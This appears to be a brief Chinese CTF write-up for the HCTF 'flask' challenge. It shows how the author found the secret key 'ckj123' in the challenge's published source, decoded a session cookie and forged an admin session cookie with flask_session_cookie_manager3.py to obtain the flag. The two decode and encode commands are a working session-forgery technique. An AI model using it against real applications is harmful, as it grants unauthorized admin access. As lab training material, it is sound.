翻页面源码，发现https://github.com/woadsl1234/hctf_flask.git 





https://blog.csdn.net/rfrder/article/details/109188719

尝试flask session注入 





在hctf——flask里发现secret_key ckj123

用flask加解密脚本

```
python flask_session_cookie_manager3.py decode -s 'ckj123' -c '.eJw9kMGKwkAQRH9l6bOHGPUieFgZDQrdQekkTF_E1ehkJuNCVKIR_31HFzzU6dFV1fWAzaEpzwbGl-Za9mBT7WH8gK8fGIMuxKRMFbFuyWY3jBd3SrCPXBuxOiJ2bVCHnDvkbEjdsU0TMpqNIWssJUsvam7F5z5VqxgtDoXnRneLGxaLvo6zuzAOsZAaPY6Qp4HNne50JLYOuXuDyjgKuVIsDSk90JzbcD8itazJ50YUjkK_CTx7sDs3h83l15WnzwvIszsVszbldYWx2FTtWs3uJsXapa8qfl2jmlqKs478S-L1avK2q_z2WH6cskG9wu9_ctr6AMBudw56cD2XzXs26Efw_AMKsG4Q.Y1IF_A.8xhpsbgIVrk1_W8K5H7hm5ajtUQ' 
```



```
python flask_session_cookie_manager3.py encode -s ckj123 -t "{'_fresh': True, '_id': b'afa93b5606513b24c519af6459059315d1587808caa8a68c4bfd1cfef846238e1ac211b5ce2e381fe2c910ac1dc64f9b57a08d7b2eba467a5cc2942e6ead3956', 'csrf_token': b'1125a094b3fc870a91edd91abde00c7e36e36ffa', 'image': b'SyP0', 'name': 'admin', 'user_id': '10'}"
```

登陆后 出现flag
